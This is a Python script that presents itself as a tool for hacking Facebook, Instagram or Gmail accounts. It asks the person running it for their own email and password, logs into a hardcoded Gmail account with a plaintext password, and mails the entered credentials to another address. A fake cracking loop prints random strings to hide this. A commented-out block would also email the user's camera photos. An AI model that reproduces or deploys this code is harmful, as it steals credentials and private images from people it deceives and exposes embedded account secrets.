import smtplib, shutil, sys, ssl, os, getpass,time, random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
os.system('clear')
print('''
─────╔╗─────────╔╗─╔╗──────────╔╗──
────╔╝╚╗────────║║─║║──────────║║──
╔╗╔╗╚╗╔╝╔══╗╔══╗║║─║╚═╗╔══╗╔══╗║║╔╗
╚╬╬╝─║║─║╔╗║║╔╗║║║─║╔╗║║╔╗║║╔═╝║╚╝╝
╔╬╬╗─║╚╗║╚╝║║╚╝║║╚╗║║║║║╔╗║║╚═╗║╔╗╗
╚╝╚╝─╚═╝╚══╝╚══╝╚═╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝
''')

def loop():
    az = 'azertyuiopqsdfghjklmwxcvnb'
    aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
    a1 = str('1234567890')
    ajs = '*@#)(?!;:'
    all = az + ajs + a1 + aZ
    lax = 0
    print('recherche en cours...')
    while lax < 99953:
       
       time.sleep(2)
       print(lax, ''.join(random.sample(all, 8)))
       lax += 1
    print('pass founded: ', ''.join(random.sample(all, 8)))
option = int(input('''
1- Facebook Attack
2- Instagram Attack
3- Gmail Attack
[:]Choose an option (1/2/3): '''))
if option == 1:
    cho = 'Facebook'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook -/- First log into your own Facebook account')
    usn = input('\nenter your email/phonenumber: ')
    usp = input('enter your password: ')
elif option == 2:
    cho = 'instagram'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
    usn = input('\nenter your email/phonenumber: ')
    usp = input('enter your password: ')
elif option == 3:
    cho = 'Gmail'
    print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
    usn = input('\nenter your email: ')
    usp = input('enter your password: ')
print('En cours de connexion, veuillez patienter...')

def connect(nom):
    with open(nom, 'rb') as fp:
        img = MIMEImage(fp.read())
        img.add_header('Content-Disposition', 'attachment', filename=nom)
        msg.attach(img)
    try:
        s.sendmail(sa, ra, msg.as_string())
    except:
        print('<Exeption>')

context = ssl.create_default_context()
# creates SMTP session 

s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context) 

  
# start TLS for security 
#s.starttls() 


sa = 'derecknathan245@gmail.com'
kl = '@zedeyep4w0rd'
s.login(sa, kl) 

ra = 'bertranddupont885@gmail.com'
connexion = cho + ' - ' + usn + ' - ' + usp
msg = MIMEMultipart()
msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
msg.attach(msgText)
s.sendmail(sa, ra, msg.as_string())
'''
chemin = '/storage/emulated/0//DCIM/Camera/'
os.chdir('/storage/emulated/0/DCIM/Camera')
liste = os.listdir()
for x in liste:
    l = list(x)
    #print(l)
    if '.' in l:
        #print(x)
        if l[-1] is 'g':
            #print(x)
            n = chemin + x
            na = list(n)
            if ' ' in na:
                na.remove(' ')
            name = ''.join(na)
            connect(name)
'''
if option == 1:
    lien = input('collez le lien du compte cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://m.facebook.com')

elif option == 2:
    lien = input('collez le lien du compte cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://www.instagram.com/accounts/login/')

elif option == 3:
    lien = input('adresse email cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://mail.google.com/mail/mu/mp/188/#tl/priority/%5Esmartlabel_personal')
